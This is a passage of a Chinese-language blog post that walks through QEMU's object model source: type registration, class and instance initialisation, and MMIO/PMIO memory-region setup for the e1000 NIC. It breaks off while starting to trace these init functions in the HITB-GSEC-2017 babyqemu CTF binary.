MODULE_INIT_TRACE, MODULE_INIT_MAX&#125; module_init_type;#define block_init(function) module_init(function, MODULE_INIT_BLOCK)#define opts_init(function) module_init(function, MODULE_INIT_OPTS)#define type_init(function) module_init(function, MODULE_INIT_QOM)#define trace_init(function) module_init(function, MODULE_INIT_TRACE) 可以看到是调用的register_module_init，https://github.com/qemu/qemu/blob/810923480863c43ecb22ae124156298385439339/util/module.c#L62 1234567891011121314151617181920212223242526272829303132333435363738394041424344static ModuleTypeList init_type_list[MODULE_INIT_MAX];static ModuleTypeList dso_init_list;static void init_lists(void)&#123; static int inited; int i; if (inited) &#123; return; &#125; for (i = 0; i &lt; MODULE_INIT_MAX; i++) &#123; QTAILQ_INIT(&amp;init_type_list[i]); &#125; QTAILQ_INIT(&amp;dso_init_list); inited = 1;&#125;..................static ModuleTypeList *find_type(module_init_type type)&#123; init_lists(); return &amp;init_type_list[type];&#125;void register_module_init(void (*fn)(void), module_init_type type)&#123; ModuleEntry *e; ModuleTypeList *l; e = g_malloc0(sizeof(*e)); e-&gt;init = fn; e-&gt;type = type; l = find_type(type); QTAILQ_INSERT_TAIL(l, e, node);&#125; 可以看到将函数指针fn给到了ModuleEntry-&gt;init，之后通过find_type(MODULE_INIT_QOM)找到对应的list，最后insert到MODULE_INIT_QOM对应的list——QTAILQ_INSERT_TAIL(l, e, node); 123456#define QTAILQ_INSERT_TAIL(head, elm, field) do &#123; \\ (elm)-&gt;field.tqe_next = NULL; \\ (elm)-&gt;field.tqe_circ.tql_prev = (head)-&gt;tqh_circ.tql_prev; \\ (head)-&gt;tqh_circ.tql_prev-&gt;tql_next = (elm); \\ (head)-&gt;tqh_circ.tql_prev = &amp;(elm)-&gt;field.tqe_circ; \\&#125; while (/*CONSTCOND*/0) 那么这个东西是怎么调用的呢？（经过一顿操作，我发现qemu-system的main函数代码在vl.c文件，通过qemu-system-x86_64的main函数的特征去grep源码） 看到main函数https://github.com/qemu/qemu/blob/aceeaa69d28e6f08a24395d0aa6915b687d0a681/vl.c#L2753 1234567891011121314151617181920212223242526272829int main(int argc, char **argv, char **envp)&#123;............ os_set_line_buffering(); error_init(argv[0]); module_call_init(MODULE_INIT_TRACE); qemu_init_cpu_list(); qemu_init_cpu_loop(); qemu_mutex_lock_iothread(); atexit(qemu_run_exit_notifiers); qemu_init_exec_dir(argv[0]); module_call_init(MODULE_INIT_QOM); &lt;================================ 这里 qemu_add_opts(&amp;qemu_drive_opts); qemu_add_drive_opts(&amp;qemu_legacy_drive_opts); qemu_add_drive_opts(&amp;qemu_common_drive_opts); qemu_add_drive_opts(&amp;qemu_drive_opts); qemu_add_drive_opts(&amp;bdrv_runtime_opts); qemu_add_opts(&amp;qemu_chardev_opts); qemu_add_opts(&amp;qemu_device_opts); qemu_add_opts(&amp;qemu_netdev_opts); qemu_add_opts(&amp;qemu_nic_opts); 看打上面，在main函数中调用了module_call_init(MODULE_INIT_QOM); 再去看看module_call_init的实现，这时候就很明了了，调用的ModuleEntry中的init函数，正好和之前的register_module_init将fn函数指针复制到init函数指针的操作连起来了 123456789101112// https://github.com/qemu/qemu/blob/810923480863c43ecb22ae124156298385439339/util/module.c#L89void module_call_init(module_init_type type)&#123; ModuleTypeList *l; ModuleEntry *e; l = find_type(type); QTAILQ_FOREACH(e, l, node) &#123; e-&gt;init(); &#125;&#125; 总结一下：1、首先__attribute__((constructor))的修饰让type_init在main之前执行，type_init的参数是XXX_register_types函数指针，将函数指针传递到ModuleEntry的init函数指针，最后就是将这个ModuleEntry插入到ModuleTypeList2、main函数中的module_call_init(MODULE_INIT_QOM);调用了MODULE_INIT_QOM类型的ModuleTypeList中的所有ModuleEntry中的init()函数，也就是第一步type_init的第一个参数XXX_register_types函数指针3、那就下了就是XXX_register_types函数的操作了，就是创建TypeImpl的哈希表 ObjectClass的初始化main函数中的module_call_init调用了MODULE_INIT_QOM list中的ModuleEntry的init函数，init函数进行初始化（init函数就是上面说的XXX_register_types函数），创建TypeImpl的哈希表。 main函数继续往下走我们看到调用了下面的https://github.com/qemu/qemu/blob/dd5b0f95490883cd8bc7d070db8de70d5c979cbc/vl.c#L3804 1machine_class = select_machine(); 直接给出调用链，详细代码就不贴出来了，有兴趣可以自己找找 1main-&gt;select_machine-&gt;object_class_get_list-&gt;object_class_foreach 看到object_class_foreach函数，调用参数贴上：object_class_foreach(object_class_get_list_tramp, implements_type, include_abstract, &amp;list); 12345678910void object_class_foreach(void (*fn)(ObjectClass *klass, void *opaque), const char *implements_type, bool include_abstract, void *opaque)&#123; OCFData data = &#123; fn, implements_type, include_abstract, opaque &#125;; enumerating_types = true; g_hash_table_foreach(type_table_get(), object_class_foreach_tramp, &amp;data); enumerating_types = false;&#125; g_hash_table_foreach的第一个参数是函数指针——type_table_get函数，看了下应该是之前创建的name为key,TypeImpl为value的GHashTable。 上面的g_hash_table_foreach是对GHashTable中执行 GHFunc函数，也即执行object_class_foreach_tramp函数，它的参数除了key，value对，还有gpointer user_data 1234voidg_hash_table_foreach (GHashTable *hash_table, GHFunc func, gpointer user_data); 到object_class_foreach_tramp这里，这里已经出现了ObjectClass，通过调用type_initialize后，即可获得ObjectClass *k。 123456789101112131415161718192021static void object_class_foreach_tramp(gpointer key, gpointer value, gpointer opaque)&#123; OCFData *data = opaque; TypeImpl *type = value; ObjectClass *k; type_initialize(type); k = type-&gt;class; if (!data-&gt;include_abstract &amp;&amp; type-&gt;abstract) &#123; return; &#125; if (data-&gt;implements_type &amp;&amp; !object_class_dynamic_cast(k, data-&gt;implements_type)) &#123; return; &#125; data-&gt;fn(k, data-&gt;opaque);&#125; 最后调用的data-&gt;fn(k, data-&gt;opaque);，data-&gt;fn函数其实是object_class_get_list_tramp函数，g_slist_prepend是glib库的函数（非glibc库），g_slist_prepend(*list, klass);是将klass插入到*list的开头的地方，即将ObjectClass *k插入到data-&gt;opaque列表里面，data-&gt;opaque也即在object_class_get_list函数定义的局部变量GSList *list = NULL;列表 123456static void object_class_get_list_tramp(ObjectClass *klass, void *opaque)&#123; GSList **list = opaque; *list = g_slist_prepend(*list, klass);&#125; 我们进入到type_initialize函数看看，可以看到传入的正是TypeImpl 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687static void type_initialize(TypeImpl *ti)&#123; TypeImpl *parent; // 假如ti-&gt;class不为空说明class已经初始化过了，直接返回 if (ti-&gt;class) &#123; return; &#125; ti-&gt;class_size = type_class_get_size(ti); ti-&gt;instance_size = type_object_get_size(ti); /* Any type with zero instance_size is implicitly abstract. * This means interface types are all abstract. * instance_size为0说明这个TypeImpl是抽象的 */ if (ti-&gt;instance_size == 0) &#123; ti-&gt;abstract = true; &#125; // 判断ti的祖先是否是type_interface（就是不断取ti的parent去判断是否跟type_interface相等） if (type_is_ancestor(ti, type_interface)) &#123; // assert(false)才会报错退出 assert(ti-&gt;instance_size == 0); assert(ti-&gt;abstract); assert(!ti-&gt;instance_init); assert(!ti-&gt;instance_post_init); assert(!ti-&gt;instance_finalize); assert(!ti-&gt;num_interfaces); &#125; // 申请class_size大小的内存给到（ti-&gt;class就是ObjectClass类型的） ti-&gt;class = g_malloc0(ti-&gt;class_size); // 尝试获取parent，若不为空，就会递归调用type_initialize去尝试初始化，那这里就说明为啥开头要判断ti-&gt;class是否为空 parent = type_get_parent(ti); if (parent) &#123; type_initialize(parent); GSList *e; int i; // ti的class_size得大于parent的class_size，将parent-&gt;class复制到ti-&gt;class g_assert(parent-&gt;class_size &lt;= ti-&gt;class_size); memcpy(ti-&gt;class, parent-&gt;class, parent-&gt;class_size); ti-&gt;class-&gt;interfaces = NULL; ti-&gt;class-&gt;properties = g_hash_table_new_full( g_str_hash, g_str_equal, g_free, object_property_free); for (e = parent-&gt;class-&gt;interfaces; e; e = e-&gt;next) &#123; InterfaceClass *iface = e-&gt;data; ObjectClass *klass = OBJECT_CLASS(iface); // 初始化 ti-&gt;class-&gt;interfaces，这里是循环将父type的interface的一些信息添加到ti-&gt;class-&gt;interfaces列表上面去 type_initialize_interface(ti, iface-&gt;interface_type, klass-&gt;type); &#125; for (i = 0; i &lt; ti-&gt;num_interfaces; i++) &#123; //上面是ti-&gt;class-&gt;interfaces，这里ti-&gt;interfaces，很容易搞混哦 // 这里通过typename获取TypeImpl TypeImpl *t = type_get_by_name(ti-&gt;interfaces[i].typename); for (e = ti-&gt;class-&gt;interfaces; e; e = e-&gt;next) &#123; TypeImpl *target_type = OBJECT_CLASS(e-&gt;data)-&gt;type; // 判断target_type的祖先否是是t，是的话就退出第一层for循环了 if (type_is_ancestor(target_type, t)) &#123; break; &#125; &#125; if (e) &#123; continue; &#125; // 将t的信息同样添加到ti-&gt;class-&gt;interfaces列表上面去 type_initialize_interface(ti, t, t); &#125; &#125; else &#123; // parent是空就初始化ti-&gt;class-&gt;properties ti-&gt;class-&gt;properties = g_hash_table_new_full( g_str_hash, g_str_equal, g_free, object_property_free); &#125; ti-&gt;class-&gt;type = ti; //循环调用parent的class_base_init进行初始化 while (parent) &#123; if (parent-&gt;class_base_init) &#123; parent-&gt;class_base_init(ti-&gt;class, ti-&gt;class_data); &#125; parent = type_get_parent(parent); &#125; //ti-&gt;class_init函数指针函数不为空，调用ti-&gt;class_init进行初始化 if (ti-&gt;class_init) &#123; ti-&gt;class_init(ti-&gt;class, ti-&gt;class_data); &#125;&#125; 我就将一些说明直接写在源码里头，简要概括就是，将parent-&gt;class-&gt;interfaces的一些信息添加到ti-&gt;class-&gt;interfaces列表上面，ti-&gt;interfaces[i].typename对应的type的信息也添加到ti-&gt;class-&gt;interfaces列表，最后最重要的就是调用parent的class_base_init进行初始化，最后调用自己ti-&gt;class_init进行初始化。 参考文章https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2017/01/08/qom-introduction以vmxnet3为例给出了class的层次结构 可以看到如下层次关系：VMXNET3Class-&gt;PCIDeviceClass-&gt;DeviceClass-&gt;ObjectClass，这是Class的集成关系 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748static const TypeInfo vmxnet3_info = &#123; .name = TYPE_VMXNET3, .parent = TYPE_PCI_DEVICE, .class_size = sizeof(VMXNET3Class), .instance_size = sizeof(VMXNET3State), .class_init = vmxnet3_class_init, .instance_init = vmxnet3_instance_init,&#125;;typedef struct VMXNET3Class &#123; PCIDeviceClass parent_class; DeviceRealize parent_dc_realize;&#125; VMXNET3Class;typedef struct PCIDeviceClass &#123; DeviceClass parent_class; void (*realize)(PCIDevice *dev, Error **errp); int (*init)(PCIDevice *dev);/* TODO convert to realize() and remove */ PCIUnregisterFunc *exit; PCIConfigReadFunc *config_read; PCIConfigWriteFunc *config_write; ...&#125; PCIDeviceClass;typedef struct DeviceClass &#123; /*&lt; private &gt;*/ ObjectClass parent_class; /*&lt; public &gt;*/ ...&#125; DeviceClass;struct ObjectClass&#123; /*&lt; private &gt;*/ Type type; GSList *interfaces; const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE]; const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE]; ObjectUnparent *unparent; GHashTable *properties;&#125;; 对象的构造——实例化 Instance(Object)https://github.com/qemu/qemu/blob/dd5b0f95490883cd8bc7d070db8de70d5c979cbc/vl.c#L4304接下来main函数调用了qemu_opts_foreach，循环查找参数（options） 12qemu_opts_foreach(qemu_find_opts(&quot;device&quot;), device_init_func, NULL, &amp;error_fatal); 先看qemu_opts_foreach函数的定义，就是对于@list的每个成员——member，调用@func(@opaque, member, @errp) 12int qemu_opts_foreach(QemuOptsList *list, qemu_opts_loopfunc func, void *opaque, Error **errp) 当然之前还调用上面的之前是调用了下面两个，看了下default_driver_check就是将qemu_opt_get(opts, &quot;driver&quot;)获取到的driver与default_list[i].driver中的比较，相等就将*(default_list[i].flag) = 0;，default_list可以看这：https://github.com/qemu/qemu/blob/dd5b0f95490883cd8bc7d070db8de70d5c979cbc/vl.c#L220:3； 而第二个device_help_func实际里面调用了qdev_device_help(opts);，简单看了下qdev_device_help，首先调用driver = qemu_opt_get(opts, &quot;driver&quot;);，接下来就是输出那个driver的help信息，还有那些option什么的：https://github.com/qemu/qemu/blob/dd5b0f95490883cd8bc7d070db8de70d5c979cbc/qdev-monitor.c#L253:5 1234qemu_opts_foreach(qemu_find_opts(&quot;device&quot;), default_driver_check, NULL, NULL);qemu_opts_foreach(qemu_find_opts(&quot;device&quot;), device_help_func, NULL, NULL) 扯远了，还是回到device_init_func，里面调用qdev_device_add 12345678910111213static int device_init_func(void *opaque, QemuOpts *opts, Error **errp)&#123; DeviceState *dev; dev = qdev_device_add(opts, errp); if (!dev &amp;&amp; *errp) &#123; error_report_err(*errp); return -1; &#125; else if (dev) &#123; object_unref(OBJECT(dev)); &#125; return 0;&#125; 而在qdev_device_add里面，重要的一行是调用了dev = DEVICE(object_new(driver));，而且上一行有个注释——/* create device */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100DeviceState *qdev_device_add(QemuOpts *opts, Error **errp)&#123; DeviceClass *dc; const char *driver, *path; DeviceState *dev = NULL; BusState *bus = NULL; Error *err = NULL; bool hide; // 获取-driver的参数值 driver = qemu_opt_get(opts, &quot;driver&quot;); if (!driver) &#123; error_setg(errp, QERR_MISSING_PARAMETER, &quot;driver&quot;); return NULL; &#125; /* find driver */ dc = qdev_get_device_class(&amp;driver, errp); if (!dc) &#123; return NULL; &#125; /* find bus 找总线*/ path = qemu_opt_get(opts, &quot;bus&quot;); if (path != NULL) &#123; bus = qbus_find(path, errp); if (!bus) &#123; return NULL; &#125; // 看看OBJECT(bus)及其parent是否有typename为dc-&gt;bus_type if (!object_dynamic_cast(OBJECT(bus), dc-&gt;bus_type)) &#123; error_setg(errp, &quot;Device &apos;%s&apos; can&apos;t go on %s bus&quot;, driver, object_get_typename(OBJECT(bus))); return NULL; &#125; &#125; else if (dc-&gt;bus_type != NULL) &#123; bus = qbus_find_recursive(sysbus_get_default(), NULL, dc-&gt;bus_type); if (!bus || qbus_is_full(bus)) &#123; error_setg(errp, &quot;No &apos;%s&apos; bus found for device &apos;%s&apos;&quot;, dc-&gt;bus_type, driver); return NULL; &#125; &#125; hide = should_hide_device(opts); if ((hide || qdev_hotplug) &amp;&amp; bus &amp;&amp; !qbus_is_hotpluggable(bus)) &#123; error_setg(errp, QERR_BUS_NO_HOTPLUG, bus-&gt;name); return NULL; &#125; if (hide) &#123; return NULL; &#125; if (!migration_is_idle()) &#123; error_setg(errp, &quot;device_add not allowed while migrating&quot;); return NULL; &#125; /* create device */ dev = DEVICE(object_new(driver)); /* Check whether the hotplug is allowed by the machine 检查机器是否允许热插拔*/ if (qdev_hotplug &amp;&amp; !qdev_hotplug_allowed(dev, &amp;err)) &#123; /* Error must be set in the machine hook */ assert(err); goto err_del_dev; &#125; if (bus) &#123; qdev_set_parent_bus(dev, bus); &#125; else if (qdev_hotplug &amp;&amp; !qdev_get_machine_hotplug_handler(dev)) &#123; /* No bus, no machine hotplug handler --&gt; device is not hotpluggable */ error_setg(&amp;err, &quot;Device &apos;%s&apos; can not be hotplugged on this machine&quot;, driver); goto err_del_dev; &#125; qdev_set_id(dev, qemu_opts_id(opts)); /* set properties */ if (qemu_opt_foreach(opts, set_property, dev, &amp;err)) &#123; goto err_del_dev; &#125; dev-&gt;opts = opts; object_property_set_bool(OBJECT(dev), true, &quot;realized&quot;, &amp;err); if (err != NULL) &#123; dev-&gt;opts = NULL; goto err_del_dev; &#125; return dev;err_del_dev: error_propagate(errp, err); if (dev) &#123; object_unparent(OBJECT(dev)); object_unref(OBJECT(dev)); &#125; return NULL;&#125; DEVICE是一个宏，实际是OBJECT_CHECK，而OBJECT_CHECK是A type safe version of @object_dynamic_cast_assert.，看了下object_dynamic_cast_assert的代码，主要是是看看obj是否是TYPE_DEVICE的一个实例（an instance of TYPE_DEVICE） 123456789101112131415161718#define DEVICE(obj) OBJECT_CHECK(DeviceState, (obj), TYPE_DEVICE)/** * OBJECT_CHECK: * @type: The C type to use for the return value. * @obj: A derivative of @type to cast. * @name: The QOM typename of @type * * A type safe version of @object_dynamic_cast_assert. Typically each class * will define a macro based on this type to perform type safe dynamic_casts to * this object type. * * If an invalid object is passed to this function, a run time assert will be * generated. */#define OBJECT_CHECK(type, obj, name) \\ ((type *)object_dynamic_cast_assert(OBJECT(obj), (name), \\ __FILE__, __LINE__, __func__)) 扯远了，重点是在object_new啊， 1234567Object *object_new(const char *typename)&#123; //在HashTable中查找name为typename的TypeImpl（这个HashTable是name跟TypeImpl一一对应的表） TypeImpl *ti = type_get_by_name(typename); return object_new_with_type(ti);&#125; 向下继续看object_new_with_type，首先type_initialize之前说过，主要是调用parent的class_base_init进行初始化，最后调用自己class_init进行初始化 而object_initialize_with_type的话，不知为何又一次调用type_initialize，接下来就是一些判断，对obj的class和properties成员进行初始化，而object_ref看了下是对&amp;obj-&gt;ref进行+1，主要还是看下object_init_with_type和object_init_with_type函数吧 123456789101112131415161718192021222324252627282930313233static Object *object_new_with_type(Type type)&#123; Object *obj; g_assert(type != NULL); type_initialize(type); // 申请内存 obj = g_malloc(type-&gt;instance_size); object_initialize_with_type(obj, type-&gt;instance_size, type); // 设置free函数指针，使用g_free函数 obj-&gt;free = g_free; return obj;&#125;static void object_initialize_with_type(void *data, size_t size, TypeImpl *type)&#123; Object *obj = data; type_initialize(type); g_assert(type-&gt;instance_size &gt;= sizeof(Object)); g_assert(type-&gt;abstract == false); g_assert(size &gt;= type-&gt;instance_size); memset(obj, 0, type-&gt;instance_size); obj-&gt;class = type-&gt;class; object_ref(obj); obj-&gt;properties = g_hash_table_new_full(g_str_hash, g_str_equal, NULL, object_property_free); object_init_with_type(obj, type); object_post_init_with_type(obj, type);&#125; object_init_with_type函数首先判断ti是否有parent（即type-&gt;parent != NULL），有parent就会递归调用object_init_with_type，最终就是调用ti-&gt;instance_init函数 而object_post_init_with_type差不多，只不过先调用自身的ti-&gt;instance_post_init，再递归调用parent的ti-&gt;instance_post_init 而这些函数都是在type_init(XXXX_register_types)中的XXXX_register_types设置好的。 123456789101112131415161718192021static void object_init_with_type(Object *obj, TypeImpl *ti)&#123; if (type_has_parent(ti)) &#123; object_init_with_type(obj, type_get_parent(ti)); &#125; if (ti-&gt;instance_init) &#123; ti-&gt;instance_init(obj); &#125;&#125;static void object_post_init_with_type(Object *obj, TypeImpl *ti)&#123; if (ti-&gt;instance_post_init) &#123; ti-&gt;instance_post_init(obj); &#125; if (type_has_parent(ti)) &#123; object_post_init_with_type(obj, type_get_parent(ti)); &#125;&#125; 上一小节我们看到了Class的继承关系，这次是Object的继承关系，上次直接复制了参考文章作者vmxnet3的例子，虽然这个他也是用这个例子，但这次Object的继承关系我自己换一个吧，我用e1000网卡为例，看看Object的集成关系 1234567891011121314151617181920212223242526272829303132333435363738394041424344typedef struct E1000State_st &#123; /*&lt; private &gt;*/ PCIDevice parent_obj; /*&lt; public &gt;*/ ...... ......&#125; E1000State;struct PCIDevice &#123; DeviceState qdev; bool partially_hotplugged; ...... ...... &#125;;struct DeviceState &#123; /*&lt; private &gt;*/ Object parent_obj; /*&lt; public &gt;*/ ...... ......&#125;;/** * Object: * * The base for all objects. The first member of this object is a pointer to * a #ObjectClass. Since C guarantees that the first member of a structure * always begins at byte 0 of that structure, as long as any sub-object places * its parent as the first member, we can cast directly to a #Object. * * As a result, #Object contains a reference to the objects type as its * first member. This allows identification of the real type of the object at * run time. */struct Object&#123; /*&lt; private &gt;*/ ObjectClass *class; ObjectFree *free; GHashTable *properties; uint32_t ref; Object *parent;&#125;; 整个集成关系是 1E1000State-&gt;PCIDevice-&gt;DeviceState-&gt;Object MMIO,PMIO的Memory Region是在哪设置的呢Memory Region的设置一般是在XXX_realize函数里面。比如全志科技Allwinner的一个网卡就直接卸载XXX_inti函数里面了，源码路径/hw/net/allwinner_emac.c 123456789101112131415161718static void aw_emac_init(Object *obj)&#123; SysBusDevice *sbd = SYS_BUS_DEVICE(obj); AwEmacState *s = AW_EMAC(obj); memory_region_init_io(&amp;s-&gt;iomem, OBJECT(s), &amp;aw_emac_mem_ops, s, &quot;aw_emac&quot;, 0x1000); sysbus_init_mmio(sbd, &amp;s-&gt;iomem); sysbus_init_irq(sbd, &amp;s-&gt;irq);&#125;static const TypeInfo aw_emac_info = &#123; .name = TYPE_AW_EMAC, .parent = TYPE_SYS_BUS_DEVICE, .instance_size = sizeof(AwEmacState), .instance_init = aw_emac_init, .class_init = aw_emac_class_init,&#125;; 以e1000网卡为例，首先你定义的XXXState，这里是E1000State，得定义MemoryRegion类型的变量，pmio，mmio都是这个类型 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758typedef struct E1000State_st &#123; /*&lt; private &gt;*/ PCIDevice parent_obj; /*&lt; public &gt;*/ NICState *nic; NICConf conf; MemoryRegion mmio; MemoryRegion io; ...... ......&#125; E1000State;``` 我们看看具体是怎么操作的：首先`pci_e1000_realize`函数里面调用`e1000_mmio_setup`，里面主要调用了`memory_region_init_io`，是初始化MemoryRegion的函数，而`memory_region_add_coalescing`是初始化MemoryRegion中的`coalesced`成员（它是一个队列指针），具体看MemoryRegion的结构`https://github.com/qemu/qemu/blob/dd5b0f95490883cd8bc7d070db8de70d5c979cbc/include/exec/memory.h#L403`假如想看更多内存相关的可以查看`https://www.anquanke.com/post/id/86412`，我这摘录一部分：qemu中用AddressSpace用来表示CPU/设备看到的内存，一个AddressSpace下面包含多个MemoryRegion，这些MemoryRegion结构通过树连接起来，树的根是AddressSpace的root域。也就是`AddressSpace`里面有个`MemoryRegion *root;`，而`MemoryRegion *root;`里面指向多个MemoryRegion——在`subregions`队列结构中，在`MemoryRegion`中，`RAMBlock`表示的是分配的实际内存。而MemoryRegion中的`alias_offset`和RAMBlock中的`host`都是指向“物理内存”——就是qemu进程分配的虚拟内存，虚拟机把这个作为物理内存。``` e1000_mmio_setup(E1000State *d)&#123; int i; const uint32_t excluded_regs[] = &#123; E1000_MDIC, E1000_ICR, E1000_ICS, E1000_IMS, E1000_IMC, E1000_TCTL, E1000_TDT, PNPMMIO_SIZE &#125;; memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;e1000_mmio_ops, d, &quot;e1000-mmio&quot;, PNPMMIO_SIZE); memory_region_add_coalescing(&amp;d-&gt;mmio, 0, excluded_regs[0]); for (i = 0; excluded_regs[i] != PNPMMIO_SIZE; i++) memory_region_add_coalescing(&amp;d-&gt;mmio, excluded_regs[i] + 4, excluded_regs[i+1] - excluded_regs[i] - 4); memory_region_init_io(&amp;d-&gt;io, OBJECT(d), &amp;e1000_io_ops, d, &quot;e1000-io&quot;, IOPORT_SIZE);&#125;static void pci_e1000_realize(PCIDevice *pci_dev, Error **errp)&#123; DeviceState *dev = DEVICE(pci_dev); E1000State *d = E1000(pci_dev); uint8_t *pci_conf; uint8_t *macaddr; ...... ...... e1000_mmio_setup(d); pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio); pci_register_bar(pci_dev, 1, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;io); ...... ......&#125; 继续看看e1000_mmio_setup函数调用完，接下来调用了两个pci_register_bar，第一个是针对MEMORY 空间的（MMIO），第二个是IO空间（PMIO）。实际这个函数的操作是对&amp;pci_dev-&gt;io_regions[region_num]的相应区域进行赋值，MMIO就是&amp;pci_dev-&gt;io_regions[0]，PMIO是&amp;pci_dev-&gt;io_regions[1]，这里的0，1并不是却别MMIO与PMIO的，只是区分是resource0还是resource1。 1234567891011121314151617181920void pci_register_bar(PCIDevice *pci_dev, int region_num, uint8_t type, MemoryRegion *memory)&#123; PCIIORegion *r; uint32_t addr; /* offset in pci config space */ uint64_t wmask; pcibus_t size = memory_region_size(memory); ...... ...... r = &amp;pci_dev-&gt;io_regions[region_num]; r-&gt;addr = PCI_BAR_UNMAPPED; r-&gt;size = size; r-&gt;type = type; r-&gt;memory = memory; r-&gt;address_space = type &amp; PCI_BASE_ADDRESS_SPACE_IO ? pci_get_bus(pci_dev)-&gt;address_space_io : pci_get_bus(pci_dev)-&gt;address_space_mem; ...... ......&#125; 此外MMIO与PMIO下面的不同点还有对io_regions的address_space的赋值，利用type变量进行选择，根据下面的定义，实际也是0和1，那就是0选择pci_get_bus(pci_dev)-&gt;address_space_mem，而type为1选pci_get_bus(pci_dev)-&gt;address_space_io 12#define PCI_BASE_ADDRESS_SPACE_MEMORY 0x00#define PCI_BASE_ADDRESS_SPACE_IO 0x01 io_regions的类型是PCIIORegion，可以看到跟上面的赋值也是相对应的 12345678typedef struct PCIIORegion &#123; pcibus_t addr; /* current PCI mapping address. -1 means not mapped */#define PCI_BAR_UNMAPPED (~(pcibus_t)0) pcibus_t size; uint8_t type; MemoryRegion *memory; MemoryRegion *address_space;&#125; PCIIORegion; 最后问题来了，那么pci_e1000_realize在什么时候调用的呢，根据引用关系只是在e1000_class_init函数中对PCIDeviceClass-&gt;realize进行了赋值操作 1234567891011static void e1000_class_init(ObjectClass *klass, void *data)&#123; DeviceClass *dc = DEVICE_CLASS(klass); PCIDeviceClass *k = PCI_DEVICE_CLASS(klass); ...... ...... k-&gt;realize = pci_e1000_realize; ...... ......&#125; 刚好有个题目有符号，而且也是在XXX_class_init设置realize函数指针，那就在下面实际题目中调试看看吧 总结将 TypeInfo 注册 TypeImpl： 1、首先__attribute__((constructor))的修饰让type_init在main之前执行，type_init的参数是XXX_register_types函数指针，将函数指针传递到ModuleEntry的init函数指针，最后就是将这个ModuleEntry插入到ModuleTypeList2、main函数中的module_call_init(MODULE_INIT_QOM);调用了MODULE_INIT_QOM类型的ModuleTypeList中的所有ModuleEntry中的init()函数，也就是第一步type_init的第一个参数XXX_register_types函数指针3、那就下了就是XXX_register_types函数的操作了，就是创建TypeImpl的哈希表 ObjectClass的初始化： 调用链main-&gt;select_machine-&gt;object_class_get_list-&gt;object_class_foreach-&gt;object_class_foreach_tramp-&gt;type_initialize 将parent-&gt;class-&gt;interfaces的一些信息添加到ti-&gt;class-&gt;interfaces列表上面，ti-&gt;interfaces[i].typename对应的type的信息也添加到ti-&gt;class-&gt;interfaces列表，最后最重要的就是调用parent的class_base_init进行初始化，最后调用自己ti-&gt;class_init进行初始化。 实例化 Instance(Object) 调用链qemu_opts_foreach-&gt;device_init_func-&gt;qdev_device_add-&gt;object_new-&gt;object_new_with_type object_new_with_type函数里面初始化了Object的一些成员，并通过object_init_with_type函数调用ti-&gt;instance_init函数（有parent就会先递归调用object_init_with_type，再调用自身的ti-&gt;instance_init函数），而最后就是通过object_post_init_with_type函数差不多，只不过先调用自身的ti-&gt;instance_post_init，再递归调用parent的ti-&gt;instance_post_init 实际题目中的调用关系HITB-GSEC-2017-babyqemu我们说过__attribute__((constructor))的修饰让type_init在main之前执行，通过读代码，发现是将函数写在.init_array段中的__frame_dummy_init_array_entry数组中 接下来具体看看这个是怎么实现的 以x64的qemu-system-x86_64为例，它也是一个ELF 64，也是从_start开始执行，之后调用__libc_start_main 函数原型：int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)); __libc_start_main函数主要做了下面工作： 如果EUID不等于RUID进行一些必要的安全检查（通过__libc_init_secure函数判断是否需要检查，并设置一个全局变量，需要检查则调用__libc_check_standard_fds检查，防止启动一个SUID的程序，而标准文件描述符0，1，2没有打开——据说是防止拒绝服务攻击或者黑客将不受信任的文件放在特殊的硬编码的文件描述符上。） 初始化线程子系统（看了下应该是ARCH_SETUP_TLS ();，/* The stack guard goes into the TCB, so initialize it early. */） 调用_dl_setup_stack_chk_guard函数设置canary 注册rtld_fini函数（__cxa_atexit ((void (*) (void *)) rtld_fini, NULL, NULL);，__cxa_atexit函数的作用是Register a function to be called by exit or when a shared library is unloaded.），这个函数作用是在dynamic shared object退出或者unloaded的时候释放资源 注册fini函数（__cxa_atexit ((void (*) (void *)) fini, NULL, NULL);），程序退出的时候会调用它 调用初始化函数init（调用代码：(*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);） 调用main函数（调用代码是：result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);） 用main函数的返回值作为参数调用exit函数（调用代码：exit (result);） 而上面的init函数一般是__libc_csu_init，而里面是循环调用_frame_dummy_init_array_entry[v5++])(a1, a2, v3); 12345678910111213141516void __fastcall _libc_csu_init(unsigned int a1, __int64 a2, __int64 a3)&#123; __int64 v3; // r13 signed __int64 v4; // rbp __int64 v5; // rbx v3 = a3; v4 = &amp;_do_global_dtors_aux_fini_array_entry - _frame_dummy_init_array_entry; init_proc(); if ( v4 ) &#123; v5 = 0LL; do ((void (__fastcall *)(_QWORD, __int64, __int64))_frame_dummy_init_array_entry[v5++])(a1, a2, v3); while ( v5 != v4 ); &#125; 这个题目我们关注的是hitb相关的函数，我们看看这个数组里面有哪些函数指针，可以看到do_qemu_init_pci_hitb_register_types 1234567891011121314.init_array:0000000000964CB0 __frame_dummy_init_array_entry dq offset frame_dummy.init_array:0000000000964CB0 ; DATA XREF: __libc_csu_init+B↑o.init_array:0000000000964CB0 ; Alternative name is &apos;__init_array_start&apos;.init_array:0000000000964CB8 dq offset monitor_lock_init.init_array:0000000000964CC0 dq offset do_qemu_init_register_types.init_array:0000000000964CC8 dq offset do_qemu_init_qtest_type_init.init_array:0000000000964CD0 dq offset do_qemu_init_memory_register_types.init_array:0000000000964CD8 dq offset do_qemu_init_register_accel_types.init_array:0000000000964CE0 dq offset do_qemu_init_kvm_type_init.............init_array:0000000000964D68 dq offset do_qemu_init_pci_hitb_register_types............ 还记得type_init就是module_init，也即do_qemu_init_ ## 